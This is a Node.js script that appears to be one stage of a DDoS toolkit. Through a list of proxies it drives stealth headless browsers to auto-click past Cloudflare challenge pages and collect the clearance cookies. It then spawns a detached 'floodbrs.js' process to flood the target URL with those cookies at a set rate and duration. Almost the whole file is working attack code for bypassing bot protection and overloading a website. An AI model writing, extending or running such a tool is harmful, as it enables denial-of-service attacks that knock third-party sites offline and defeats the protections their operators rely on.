const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    CYAN: '\x1b[36m',
    RESET: '\x1b[0m'
};

if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36`
];

// REAL Cloudflare Detection
const detectCloudflareChallenge = async (page) => {
    try {
        const title = await page.title();
        const url = page.url();
        
        // Real Cloudflare indicators
        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           url.includes('challenges.cloudflare.com') ||
                           title === 'Just a moment...' ||
                           title.includes('DDOS Protection') ||
                           title.includes('Please wait');
        
        if (isChallenge) {
            coloredLog(COLORS.YELLOW, `[CHALLENGE] Detected: "${title}"`);
            return true;
        }
        
        return false;
    } catch (error) {
        return false;
    }
};

// REAL Challenge Solving - NO SIMULATION
const solveCloudflareChallenge = async (page, browserProxy) => {
    coloredLog(COLORS.WHITE, `[CLOUDFLARE] Solving challenge for: ${maskProxy(browserProxy)}`);
    
    let solved = false;
    const maxWait = 90; // 90 seconds max
    
    for (let i = 0; i < maxWait; i++) {
        try {
            // Check current status
            const currentTitle = await page.title();
            const currentUrl = page.url();
            
            coloredLog(COLORS.YELLOW, `[STATUS] ${i+1}/${maxWait}s - "${currentTitle}"`);
            
            // Check if challenge is solved
            if (!(await detectCloudflareChallenge(page))) {
                coloredLog(COLORS.GREEN, `[SUCCESS] Challenge completed!`);
                solved = true;
                break;
            }
            
            // REAL INTERACTION - Find and click actual challenge elements
            const challengeSelectors = [
                // Cloudflare challenge buttons
                'input[type="checkbox"]',
                'input[type="submit"]', 
                'button[type="submit"]',
                '.hcaptcha-box',
                '#challenge-success',
                '[name="jschl-answer"]',
                '#success-button',
                '.verify-you-are-human',
                '.big-button',
                '.cf-btn',
                '.turnstile-wrapper iframe',
                '#challenge-form input[type="submit"]',
                'input#cf-input',
                '.cf-form-input',
                '.selection',
                '.label',
                '.checkbox',
                '.mark'
            ];
            
            let clicked = false;
            for (const selector of challengeSelectors) {
                try {
                    const elements = await page.$$(selector);
                    for (const element of elements) {
                        const isVisible = await element.isIntersectingViewport();
                        if (isVisible) {
                            await element.click();
                            coloredLog(COLORS.CYAN, `[ACTION] Clicked: ${selector}`);
                            clicked = true;
                            await sleep(3);
                            break;
                        }
                    }
                    if (clicked) break;
                } catch (e) {}
            }
            
            // If no elements found, try frame interaction
            if (!clicked) {
                const frames = page.frames();
                for (const frame of frames) {
                    try {
                        if (frame.url().includes('challenges.cloudflare.com') || 
                            frame.url().includes('hcaptcha.com') ||
                            frame.url().includes('cloudflare')) {
                            
                            coloredLog(COLORS.CYAN, `[FRAME] Found challenge frame: ${frame.url()}`);
                            
                            // Try to click in frame
                            const frameSelectors = ['checkbox', 'button', 'input', 'div'];
                            for (const selector of frameSelectors) {
                                const elements = await frame.$$(selector);
                                for (const element of elements) {
                                    try {
                                        await element.click();
                                        coloredLog(COLORS.CYAN, `[FRAME-CLICK] Clicked ${selector} in frame`);
                                        clicked = true;
                                        await sleep(2);
                                        break;
                                    } catch (e) {}
                                }
                                if (clicked) break;
                            }
                        }
                    } catch (e) {}
                }
            }
            
            // Wait between attempts
            await sleep(3);
            
        } catch (error) {
            coloredLog(COLORS.RED, `[ERROR] Challenge step error: ${error.message}`);
        }
    }
    
    if (!solved) {
        throw new Error('Challenge timeout after ' + maxWait + ' seconds');
    }
    
    return true;
};

// Get Cloudflare Cookies
const getCloudflareCookies = async (page, targetURL) => {
    const cookies = await page.cookies();
    
    // Look for ALL Cloudflare cookies
    const cfCookies = cookies.filter(cookie => 
        cookie.name.includes('cf_') || 
        cookie.name.includes('_cf') ||
        cookie.name === 'cf_clearance' ||
        cookie.name === '__cf_bm' ||
        cookie.name === '__cflb'
    );
    
    if (cfCookies.length === 0) {
        throw new Error('No Cloudflare cookies found');
    }
    
    // Log all cookies found
    cfCookies.forEach(cookie => {
        coloredLog(COLORS.CYAN, `[COOKIE] ${cookie.name}: ${cookie.value.substring(0, 30)}...`);
    });
    
    const cookieString = cfCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
    return cookieString;
};

// REAL Browser Launch
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            '--disable-blink-features=AutomationControlled',
            '--disable-infobars',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process'
        ]
    };

    if (browserProxy) {
        options.args.push(`--proxy-server=http://${browserProxy}`);
    }

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Launching with proxy: ${maskProxy(browserProxy)} (Attempt ${attempt})`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Set longer timeouts
        page.setDefaultNavigationTimeout(120000);
        page.setDefaultTimeout(60000);

        // Navigate to target
        coloredLog(COLORS.WHITE, `[NAVIGATE] Going to: ${targetURL}`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle2',
            timeout: 120000
        });

        // Check for Cloudflare challenge
        if (await detectCloudflareChallenge(page)) {
            coloredLog(COLORS.YELLOW, `[CHALLENGE] Starting challenge solving...`);
            await solveCloudflareChallenge(page, browserProxy);
        } else {
            coloredLog(COLORS.GREEN, `[INFO] No challenge detected`);
        }

        // Final verification wait
        await sleep(5);

        // Get cookies
        const cookieString = await getCloudflareCookies(page, targetURL);
        const finalTitle = await page.title();
        const finalURL = page.url();

        coloredLog(COLORS.GREEN, `[SUCCESS] Got cookies for: ${maskProxy(browserProxy)}`);
        coloredLog(COLORS.CYAN, `[FINAL] Title: "${finalTitle}"`);
        coloredLog(COLORS.CYAN, `[FINAL] URL: ${finalURL}`);

        totalSolves++;
        coloredLog(COLORS.GREEN, `[STATS] Total successful solves: ${totalSolves}`);

        await browser.close();
        return { 
            title: finalTitle, 
            browserProxy, 
            cookies: cookieString, 
            userAgent,
            finalURL 
        };
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        coloredLog(COLORS.RED, `[ERROR] Attempt ${attempt} failed: ${error.message}`);
        
        if (attempt < maxRetries) {
            await sleep(5);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        return null;
    }
};

// Thread Handler
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[THREAD] Max retries reached for: ${maskProxy(browserProxy)}`);
        done(null, { task, currentTask: queue.length() });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            // Success
            const successInfo = {
                Page: response.title,
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                'Final-URL': response.finalURL,
                cookie: response.cookies
            };
            
            coloredLog(COLORS.GREEN, `[SUCCESS] ${JSON.stringify(successInfo, null, 2)}`);

            // Spawn flood process
            try {
                coloredLog(COLORS.YELLOW, `[FLOOD] Spawning flood process...`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[FLOOD] Process spawned`);
                
            } catch (floodError) {
                coloredLog(COLORS.RED, `[FLOOD] Error: ${floodError.message}`);
            }

            done(null, { task });
        } else {
            // Retry
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying: ${maskProxy(browserProxy)} (${retries + 1}/${COOKIES_MAX_RETRIES})`);
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        coloredLog(COLORS.RED, `[THREAD] Error: ${error.message}`);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Async queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[QUEUE] All proxies processed');
});

queue.error((err, task) => {
    coloredLog(COLORS.RED, `[QUEUE] Error: ${err.message}`);
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[MAIN] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[MAIN] Starting with ${proxies.length} proxies, ${threads} threads, ${duration}s`);
    coloredLog(COLORS.CYAN, `[MAIN] Target: ${targetURL}`);

    proxies.forEach(browserProxy => {
        queue.push({ browserProxy });
    });

    coloredLog(COLORS.YELLOW, `[TIMER] Running for ${duration} seconds`);
    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[TIMER] Time up - Cleaning...');
        queue.kill();

        exec('pkill -f floodbrs.js', (err) => {
            if (err && err.code !== 1) {
                coloredLog(COLORS.RED, `[CLEANUP] Error killing floodbrs: ${err.message}`);
            } else {
                coloredLog(COLORS.GREEN, '[CLEANUP] Killed floodbrs processes');
            }
        });

        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                coloredLog(COLORS.RED, `[CLEANUP] Error killing Chrome: ${err.message}`);
            } else {
                coloredLog(COLORS.GREEN, '[CLEANUP] Killed Chrome processes');
            }
        });

        setTimeout(() => {
            coloredLog(COLORS.GREEN, `[FINAL] Completed - Total solves: ${totalSolves}`);
            process.exit(0);
        }, 5000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[UNCAUGHT] ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[UNHANDLED] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[START] Cloudflare Solver Starting...');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN] Fatal error: ${err.message}`);
    process.exit(1);
});